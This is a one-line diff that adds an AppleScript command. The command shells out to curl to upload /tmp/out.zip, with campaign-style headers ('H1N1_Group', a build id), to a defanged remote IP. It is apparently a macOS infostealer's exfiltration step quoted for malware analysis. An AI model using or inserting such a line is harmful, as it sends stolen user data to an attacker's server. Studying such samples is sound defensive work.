@@ -1,0 +1,1 @@
+set result_send to (do shell script \"curl -X POST -H \\\"uuid: 399122bdb9844f7d934631745e22bd06\\\" -H \\\"user: H1N1_Group\\\" -H \\\"buildid: id777\\\" --data-binary @/tmp/out.zip http:// 79.137.192[.]4/p2p\")
